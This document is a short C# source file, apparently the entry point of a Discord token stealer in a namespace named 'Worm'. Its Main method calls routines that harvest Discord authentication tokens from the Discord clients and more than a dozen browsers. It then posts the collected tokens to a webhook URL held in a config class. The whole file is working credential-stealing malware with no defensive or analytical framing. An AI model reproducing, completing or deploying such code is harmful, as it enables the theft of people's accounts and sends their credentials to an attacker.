using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

namespace Worm
{
    internal static class Program
    {
        public static List<string> goSendTokens = Stealing.AllTokens;

        [STAThread]
        private static void Main()
        {
            Task.WaitAll(
            Stealing.DiscordApp(),
            Stealing.DiscordCanary(),
            Stealing.DiscordPTB(),
            Stealing.Chrome(),
            Stealing.ChromeBeta(),
            Stealing.FireFox(),
            Stealing.Opera(),
            Stealing.OperaGX(),
            Stealing.Edge(),
            Stealing.Yandex(),
            Stealing.Brave(),
            Stealing.EpicPrivacy(),
            Stealing.Vivaldi(),
            Stealing.ThreeHundredSixty(),
            Stealing.CocCoc()
                );

            //Tokens
            string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());

            Dictionary<string, string> Token = new Dictionary<string, string>
                    {
                        { "content", "> **Tokens**; \n" +
                        "```" + Tokens + "```"},
                        { "avatar_url", Config.AvatarUrl},
                        { "username", Config.Username}
            };

            // Sending Webhook
            HttpClient cl = new HttpClient();
            cl.PostAsync(Config.Url, new FormUrlEncodedContent(Token)).GetAwaiter().GetResult();
        }
    }
}